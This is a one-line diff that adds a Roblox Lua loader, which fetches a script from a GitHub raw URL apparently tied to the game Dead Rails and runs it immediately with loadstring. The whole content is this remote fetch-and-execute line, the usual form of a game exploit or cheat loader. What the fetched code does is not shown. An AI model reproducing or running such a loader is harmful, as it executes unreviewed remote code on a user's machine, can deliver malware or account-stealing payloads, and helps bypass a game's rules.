@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/event-dead-rails-spam7-dr4f7ah6jqnk0k.lua"))()
